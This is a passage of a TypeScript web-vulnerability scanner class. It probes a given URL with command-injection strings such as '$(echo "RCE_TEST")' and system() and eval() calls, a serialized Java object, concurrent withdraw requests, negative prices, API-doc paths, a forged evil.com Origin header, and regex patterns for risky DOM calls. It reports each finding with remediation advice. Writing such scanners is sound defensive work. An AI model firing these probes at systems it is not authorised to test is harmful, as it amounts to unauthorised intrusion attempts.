      '$(echo "RCE_TEST")',
      'phpinfo()',
      'system("echo RCE_TEST")',
      'eval("echo RCE_TEST")',
    ];

    for (const payload of rcePayloads) {
      try {
        const testUrl = `${url}?cmd=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        if (response.data.includes('RCE_TEST') || response.data.includes('phpinfo')) {
          results.push({
            testName: 'Remote Code Execution (RCE)',
            category: 'Code Execution',
            severity: 'critical',
            vulnerable: true,
            description: 'Application is vulnerable to remote code execution!',
            evidence: 'Code execution confirmed',
            payload: payload,
            recommendation: 'CRITICAL: Never execute user input as code. Disable dangerous functions.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Remote Code Execution (RCE)',
        category: 'Code Execution',
        severity: 'info',
        vulnerable: false,
        description: 'No RCE vulnerabilities detected in basic tests.',
        recommendation: 'Never execute user input as code.',
      });
    }

    return results;
  }

  /**
   * Test Deserialization Attacks
   */
  private static async testDeserializationAttacks(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const deserializationPayloads = [
      'O:8:"stdClass":0:{}',
      'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4',
    ];

    for (const payload of deserializationPayloads) {
      try {
        const response = await axios.post(url, payload, {
          headers: { 'Content-Type': 'application/x-java-serialized-object' },
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        if (response.status === 500 || response.data.includes('deserialization')) {
          results.push({
            testName: 'Insecure Deserialization',
            category: 'Deserialization',
            severity: 'critical',
            vulnerable: true,
            description: 'Application may be vulnerable to insecure deserialization.',
            evidence: 'Deserialization endpoint detected',
            recommendation: 'Avoid deserializing untrusted data. Use safe serialization formats like JSON.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Insecure Deserialization',
        category: 'Deserialization',
        severity: 'info',
        vulnerable: false,
        description: 'No deserialization vulnerabilities detected.',
        recommendation: 'Avoid deserializing untrusted data.',
      });
    }

    return results;
  }

  /**
   * Test Race Conditions
   */
  private static async testRaceConditions(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    try {
      // Send multiple concurrent requests
      const promises = Array(10).fill(null).map(() => 
        axios.post(url, { action: 'withdraw', amount: 100 }, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        })
      );

      await Promise.all(promises);

      results.push({
        testName: 'Race Condition',
        category: 'Business Logic',
        severity: 'info',
        vulnerable: false,
        description: 'Race condition testing requires specific business logic knowledge.',
        recommendation: 'Implement proper locking mechanisms for critical operations.',
      });
    } catch (error) {
      results.push({
        testName: 'Race Condition',
        category: 'Business Logic',
        severity: 'info',
        vulnerable: false,
        description: 'Could not test for race conditions.',
        recommendation: 'Implement proper locking mechanisms for critical operations.',
      });
    }

    return results;
  }

  /**
   * Test Business Logic Flaws
   */
  private static async testBusinessLogicFlaws(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    // Test negative values
    try {
      const response = await axios.post(url, { price: -100, quantity: 1 }, {
        timeout: this.TIMEOUT,
        validateStatus: () => true,
        httpsAgent: this.getHttpsAgent(),
      });

      if (response.status === 200) {
        results.push({
          testName: 'Business Logic Flaw - Negative Values',
          category: 'Business Logic',
          severity: 'high',
          vulnerable: true,
          description: 'Application accepts negative values which may lead to business logic bypass.',
          evidence: 'Negative value accepted',
          recommendation: 'Validate all numeric inputs for appropriate ranges.',
        });
      }
    } catch (error) {
      // Continue
    }

    if (results.length === 0) {
      results.push({
        testName: 'Business Logic Flaws',
        category: 'Business Logic',
        severity: 'info',
        vulnerable: false,
        description: 'Business logic testing requires application-specific knowledge.',
        recommendation: 'Implement comprehensive input validation and business rule enforcement.',
      });
    }

    return results;
  }

  /**
   * Test API Vulnerabilities
   */
  private static async testAPIVulnerabilities(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    // Test for exposed API documentation
    const apiPaths = [
      '/api/docs',
      '/api/swagger',
      '/swagger-ui.html',
      '/api-docs',
      '/graphql',
      '/api/v1',
      '/api/v2',
    ];

    for (const path of apiPaths) {
      try {
        const testUrl = `${url}${path}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: (status) => status === 200,
          httpsAgent: this.getHttpsAgent(),
        });

        if (response.status === 200) {
          results.push({
            testName: 'Exposed API Documentation',
            category: 'API Security',
            severity: 'medium',
            vulnerable: true,
            description: `API documentation exposed at ${path}`,
            evidence: `Accessible at: ${testUrl}`,
            recommendation: 'Restrict access to API documentation in production.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'API Security',
        category: 'API Security',
        severity: 'info',
        vulnerable: false,
        description: 'No exposed API documentation found.',
        recommendation: 'Implement proper API authentication and rate limiting.',
      });
    }

    return results;
  }

  /**
   * Test WebSocket Security
   */
  private static async testWebSocketSecurity(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    results.push({
      testName: 'WebSocket Security',
      category: 'WebSocket',
      severity: 'info',
      vulnerable: false,
      description: 'WebSocket testing requires specific endpoint knowledge.',
      recommendation: 'Implement authentication, input validation, and rate limiting for WebSocket connections.',
    });

    return results;
  }

  /**
   * Test CORS Misconfiguration
   */
  private static async testCORSMisconfiguration(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    try {
      const response = await axios.get(url, {
        headers: { 'Origin': 'https://evil.com' },
        timeout: this.TIMEOUT,
        httpsAgent: this.getHttpsAgent(),
      });

      const corsHeader = response.headers['access-control-allow-origin'];
      const credentialsHeader = response.headers['access-control-allow-credentials'];

      if (corsHeader === '*' || (corsHeader === 'https://evil.com' && credentialsHeader === 'true')) {
        results.push({
          testName: 'CORS Misconfiguration',
          category: 'CORS',
          severity: 'high',
          vulnerable: true,
          description: 'Insecure CORS configuration allows unauthorized cross-origin requests.',
          evidence: `Access-Control-Allow-Origin: ${corsHeader}`,
          recommendation: 'Restrict CORS to trusted origins. Never use wildcard with credentials.',
        });
      } else {
        results.push({
          testName: 'CORS Configuration',
          category: 'CORS',
          severity: 'info',
          vulnerable: false,
          description: 'CORS configuration appears secure or not configured.',
          recommendation: 'Ensure CORS is properly configured for your use case.',
        });
      }
    } catch (error) {
      results.push({
        testName: 'CORS Configuration',
        category: 'CORS',
        severity: 'info',
        vulnerable: false,
        description: 'Could not test CORS configuration.',
        recommendation: 'Ensure CORS is properly configured.',
      });
    }

    return results;
  }

  /**
   * Test Clickjacking
   */
  private static async testClickjacking(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    try {
      const response = await axios.get(url, {
        timeout: this.TIMEOUT,
        httpsAgent: this.getHttpsAgent(),
      });

      const xFrameOptions = response.headers['x-frame-options'];
      const csp = response.headers['content-security-policy'];
      
      const hasFrameProtection = xFrameOptions || (csp && csp.includes('frame-ancestors'));

      if (!hasFrameProtection) {
        results.push({
          testName: 'Clickjacking',
          category: 'Clickjacking',
          severity: 'medium',
          vulnerable: true,
          description: 'Application lacks clickjacking protection.',
          evidence: 'No X-Frame-Options or CSP frame-ancestors directive',
          recommendation: 'Add X-Frame-Options: DENY or CSP frame-ancestors directive.',
        });
      } else {
        results.push({
          testName: 'Clickjacking Protection',
          category: 'Clickjacking',
          severity: 'info',
          vulnerable: false,
          description: 'Clickjacking protection is in place.',
          recommendation: 'Continue using frame protection headers.',
        });
      }
    } catch (error) {
      results.push({
        testName: 'Clickjacking',
        category: 'Clickjacking',
        severity: 'info',
        vulnerable: false,
        description: 'Could not test clickjacking protection.',
        recommendation: 'Implement X-Frame-Options or CSP frame-ancestors.',
      });
    }

    return results;
  }

  /**
   * Test DOM-based vulnerabilities
   */
  private static async testDOMBasedVulnerabilities(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    try {
      const response = await axios.get(url, {
        timeout: this.TIMEOUT,
        httpsAgent: this.getHttpsAgent(),
      });

      const $ = cheerio.load(response.data);
      const scripts = $('script').text();

      // Check for dangerous DOM operations
      const dangerousPatterns = [
        /document\.write\(/,
        /\.innerHTML\s*=/,
        /eval\(/,
        /setTimeout\([^)]*\+/,
        /setInterval\([^)]*\+/,
        /location\.href\s*=.*\+/,
        /document\.location\s*=.*\+/,
      ];

      const foundPatterns = dangerousPatterns.filter(pattern => pattern.test(scripts));

      if (foundPatterns.length > 0) {
        results.push({
          testName: 'DOM-based Vulnerabilities',
          category: 'DOM Security',
          severity: 'medium',
          vulnerable: true,
          description: 'Potentially dangerous DOM operations detected in JavaScript.',
          evidence: `Found ${foundPatterns.length} dangerous pattern(s)`,
          recommendation: 'Avoid dangerous DOM operations. Use textContent instead of innerHTML. Sanitize all user input.',
        });
      } else {
        results.push({
          testName: 'DOM-based Vulnerabilities',
          category: 'DOM Security',
          severity: 'info',
          vulnerable: false,
          description: 'No obvious DOM-based vulnerabilities detected.',
          recommendation: 'Continue avoiding dangerous DOM operations.',
        });
      }
    } catch (error) {
      results.push({
        testName: 'DOM-based Vulnerabilities',
        category: 'DOM Security',
        severity: 'info',
        vulnerable: false,
        description: 'Could not analyze DOM operations.',
        recommendation: 'Manually review JavaScript for DOM-based vulnerabilities.',
      });
    }

    return results;
  }

  /**
   * Calculate overall risk score
   */
  private static calculateRiskScore(results: PenetrationTestResult[]): number {
    let score = 0;
    const weights = {
      critical: 25,
      high: 15,
      medium: 8,
      low: 3,
      info: 0,
    };

    results.forEach(result => {
      if (result.vulnerable) {
        score += weights[result.severity];
      }
    });

    return Math.min(100, score);
  }
}

